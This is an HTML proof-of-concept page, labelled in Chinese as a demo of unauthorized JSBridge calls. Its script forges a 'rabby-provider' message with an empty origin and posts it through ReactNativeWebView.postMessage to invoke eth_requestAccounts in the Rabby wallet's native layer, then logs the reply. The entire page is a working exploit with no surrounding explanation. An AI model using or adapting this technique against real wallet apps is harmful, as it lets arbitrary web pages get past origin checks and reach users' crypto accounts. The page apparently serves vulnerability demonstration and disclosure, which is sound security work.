<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <title>JSB安全问题</title>
    </head>
    <body>
        <h2>越权调用JSB演示</h2>
        <p id="msg">==== 信息记录 ====</p>
        <button id="connectBtn">调用requestAccounts</button>
        <script>
            window.addEventListener("message", (event) => {
                const data = event.data;
                if (data.data != null && data.data.id === 307038727) {
                    document.getElementById("msg").innerText += `\nrequestAccounts调用结果: ${JSON.stringify(data)}`;
                }
                document.getElementById("msg").innerText += `\n收到消息: ${data}`;
            });

            document
                .getElementById("connectBtn")
                .addEventListener("click", async () => {
                    document.getElementById("msg").innerText +=
                        "\n手动调用requestAccounts\n";
                    ReactNativeWebView.postMessage(
                        '{"name":"rabby-provider","data":{"method":"eth_requestAccounts","jsonrpc":"2.0","id":307038727,"toNative":true},"origin":""}'
                    );
                });
        </script>
    </body>
</html>
